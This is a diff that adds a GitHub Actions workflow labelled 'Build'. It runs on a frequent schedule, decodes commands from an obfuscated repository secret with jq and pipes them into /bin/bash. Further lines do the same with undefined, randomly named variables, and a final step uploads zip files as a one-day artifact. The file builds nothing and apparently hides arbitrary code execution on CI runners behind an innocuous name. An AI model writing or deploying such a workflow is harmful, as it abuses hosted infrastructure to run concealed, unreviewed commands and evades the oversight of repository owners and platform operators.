@@ -1,0 +1,28 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '24 3,9,15,21 * * *'
+jobs:
+  start:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute task
+        env:
+          jyiw80: ${{ secrets.jyiw80 }}
+        run: |
+          printf '%s' "$jyiw80" | jq -r .slxgj05472 | /bin/bash
+          printf '%s' "$b9" | jq -r .jrd5 | /bin/bash
+          echo $jd68884 | jq -r .aojpt2 | /bin/bash
+          echo $dqht198 | jq -r .rieff2 | /bin/bash
+          printf '%s' "$c9260" | jq -r .ir53392 | /bin/bash
+
+      - name: Persist data
+        if: ${{ always() }}
+        uses: actions/upload-artifact@v4
+        with:
+          name: UtAerMGb
+          path: "*.zip"
+          retention-days: 1
